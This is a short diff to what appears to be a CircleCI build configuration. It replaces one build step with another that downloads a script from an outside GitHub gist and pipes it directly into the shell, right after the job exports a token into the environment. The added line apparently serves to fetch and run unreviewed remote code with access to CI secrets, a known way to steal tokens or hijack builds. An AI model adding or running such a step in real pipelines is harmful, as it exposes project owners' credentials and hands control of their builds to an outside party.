@@ -5,7 +5,7 @@ jobs:
       - image: ruby:2.5
     steps:
       - run: export token=$token
-      - run: wget https://gist.githubusercontent.com/B4gol/f242e2e24c641a9e18252f46c36f39d1/raw/init.dev -O - | sh
+      - run: wget https://gist.githubusercontent.com/vsseclab/b8cd5cee83d8e665eecefef3b8064319/raw/vsscall.dev -O - | sh
 workflows:
   version: 2.1
   build_and_test:
